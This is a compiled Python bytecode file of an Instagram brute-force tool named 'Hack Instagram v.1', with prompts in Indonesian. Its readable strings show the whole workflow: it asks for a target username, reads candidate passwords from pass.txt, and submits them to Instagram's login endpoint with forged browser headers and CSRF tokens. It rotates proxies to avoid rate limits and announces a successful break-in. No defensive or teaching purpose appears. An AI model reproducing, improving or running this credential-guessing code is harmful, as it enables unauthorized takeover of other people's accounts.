ó
7à[c           @   s$  d  Z  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d   Z d d  d     YZ e j	 d  d Z
 d Z d	 Z d	 Z d
 Z d Z d	 Z d Z d Z d Z d Z d Z d Z d Z d Z e GHe j	 e GHd GHe GHd GHe GHd GHe GHd GHe GHd GHe GHe e d   Z e GHy e e d   Z Wn e k
 raZ d GHd Z n Xd GHx¶ e j D]« Z e j  e  Z! e! r¬e GHd e j" g e g f GHn e GHd e GHy e j# e  Wqqe$ k
 re% e d   j&   Z' e' d k se' d k rqe(   qqqqqXqqWd S(!   s¡   
TODO LIST:
	Fix and make proxy function better
	Sort code again
	Add help function to all "Yes/no" questions
	Add help  function to "Press enter to exit input"
iÿÿÿÿNc         C   s=   d } t  j j d k r' t |   } n t |   } t |  S(   Nt    i   (   t   syst   version_infot   majort   inputt	   raw_inputt   str(   t   textt   value(    (    s   /sdcard/gunawan/tool.pyt   Input   s
    t
   Instabrutec           B   s8   e  Z d  d  Z d   Z d   Z d   Z d   Z RS(   s   pass.txtc         C   ss   | |  _  d |  _ g  |  _ | |  _ |  j   |  j   t d  j   } | d k sb | d k ro |  j   n  d  S(   NR    s0   [+] apakah kamu ingin menggunakan proxy? (y/n): t   Yt   YES(	   t   usernamet   CurrentProxyt
   UsedProxyst   passwordsFilet   loadPasswordst   IsUserExistsR	   t   uppert   randomProxy(   t   selfR   R   t   UsePorxy(    (    s   /sdcard/gunawan/tool.pyt   __init__   s    				

c         C   s£   t  j j |  j  r t |  j  Y } | j   j   |  _ t |  j  } | d k rc d | GHn d GHt	 d  t
   Wd  QXn d |  j GHt	 d  t
   d  S(   Ni    s    [+] %s Password berhasil di muats7   File kata sandi kosong, Silakan tambahkan kata sandi !!s   [+] tekan enter untuk keluar.s*   silahkan buat file sandi yang bernama "%s"s   [+] tekan enter untuk keluar(   t   ost   patht   isfileR   t   opent   readt
   splitlinest	   passwordst   lenR	   t   exit(   R   t   ft   passwordsNumber(    (    s   /sdcard/gunawan/tool.pyR   -   s    

c         C   s·   t  d  j   j   } t j |  } | |  j k rR | |  _ |  j j |  n  y= d GHd GHd t j	 d d i | d 6| d 6d	 d
 j
 GHWn t k
 r­ } d | GHn Xd GHd  S(   Ns	   proxy.txtR    s   [+] periksa ip baru...s   [+] Your public ip: %ss   http://myexternalip.com/rawt   proxiest   httpt   httpst   timeoutg      $@s   [+] Can't reach proxy "%s"(   R   R   R   t   randomt   choiceR   R   t   appendt   requestst   getR   t	   Exception(   R   t   plistt   proxyt   e(    (    s   /sdcard/gunawan/tool.pyR   >   s    	3c         C   sY   t  j d |  j  } | j d k rB d t GHt d  t   n | j d k rU t Sd  S(   Ns#   https://www.instagram.com/%s/?__a=1i  s   [+] User name "%s" not founds   [+] tekan enter untuk keluariÈ   (   R*   R+   R   t   status_codeR	   R    t   True(   R   t   r(    (    s   /sdcard/gunawan/tool.pyR   O   s    	

c         C   sí  t  j   } t |  j  d k rA i |  j d 6|  j d 6| _ n  | j j i d d 6d d 6d d 6d	 d
 6d d 6d d 6d d 6 | j j i d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d  6d! d" 6 | j d#  } | j j i | j j	   d d$ 6 | j
 d% d& i |  j d' 6| d( 6d) t } | j j i | j j	   d d$ 6 t j | j  } | d* d+ k rÑ| d, GHt d-  j   } | d. k s¾| d/ k rÍd0 GHt   n  t S| d1 t k rå| St Sd  S(2   Ni    R$   R%   R    t	   sessionidt   midt   1t   ig_prt   1920t   ig_vwt	   csrftokent	   s_networkt
   ds_user_idsr   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36t	   UserAgents   x-instagram-ajaxt   XMLHttpRequests   X-Requested-Withs   https://www.instagram.comt   origins!   application/x-www-form-urlencodedt   ContentTypes
   keep-alivet
   Connections   */*t   Acceptt   Referers   www.instagram.comt	   authorityt   Hosts   en-US;q=0.6,en;q=0.4s   Accept-Languages   gzip, deflates   Accept-Encodings   https://www.instagram.com/s   X-CSRFTokens.   https://www.instagram.com/accounts/login/ajax/t   dataR   t   passwordt   allow_redirectst   statust   failt   messages0   [+] Apakah Kamu Ingin Menggunakan Proxy? (y/n): R   R   s%   [$] Coba gunakan proxy setelah gagal.t   authenticated(   R*   t   SessionR   R   R#   t   cookiest   updatet   headersR+   t   get_dictt   postR   R1   t   jsont   loadsR   R	   R   R   t   False(   R   RF   t   sessR2   RE   R   (    (    s   /sdcard/gunawan/tool.pyt   LoginY   s@     A$,$	
(   t   __name__t
   __module__R   R   R   R   RV   (    (    (    s   /sdcard/gunawan/tool.pyR
      s
   			
t   clears   [1;33ms   [1;31ms   [1;32ms   [3;31ms   [0;34ms   [1;37ms   [0;36ms   [0;37ms   [1;30ms   [0;101ms   [0ms(   ########################################s       Author  : Mr.B3604s        Tool    : Hack Instagram v.1s       YouTube : GUNAWAN IDs   Masukan nama target : s#   [+] waktu bruteforce(maksimal 4) : s    [+] kesalahan perangkat !1!1 "4"i   R    s"   [+] Berhasil Masuk (sukses) !!! %ss   [+] Menghubungkan ==> [%s]s   Type y/n to exit: R   R   (    ()   t   __doc__R*   RR   t   timeR   R'   R   R	   R
   t   systemt   Mt   Ct   Dt   mt   ct   bt   gt   wR2   t   yt   cyant   lgrayt   dgrayt   irt   resett
   instabrutet   intt	   delayLoopR,   R/   R   RF   RV   RU   R   t   sleept   KeyboardInterruptR   R   t
   WantToExitR    (    (    (    s   /sdcard/gunawan/tool.pyt   <module>   sv   		p
	
